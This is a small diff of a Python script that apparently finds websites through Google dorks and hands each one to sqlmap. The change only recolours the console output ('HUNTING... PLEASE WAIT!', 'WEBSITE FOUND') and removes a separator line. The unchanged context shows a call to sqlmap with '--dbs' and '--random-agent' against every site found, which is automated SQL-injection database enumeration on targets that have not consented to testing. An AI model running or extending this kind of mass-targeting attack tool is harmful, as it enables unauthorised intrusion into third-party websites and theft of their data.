@@ -127,9 +127,8 @@ if at == "DS" :
         datetime.date(2022, 4, 1))
    ):
     time.sleep(4.0)
-    print(Fore.GREEN+"HUNTING... PLEASE WAIT!")
-    print(Fore.RED +"[:] DORK INSERTED: " + dork, '\n' + "[!] WEBSITE FOUND: " + i)
-    print(Fore.RED + "========================================")
+    print(Fore.YELLOW+"HUNTING... PLEASE WAIT!")
+    print(Fore.GREEN +"[:] DORK INSERTED: " + dork, '\n' + Fore.RED +"[!] WEBSITE FOUND: " + i)
     time.sleep(10.0)
     call(["sqlmap", i ,"--dbs", "--random-agent"])
 
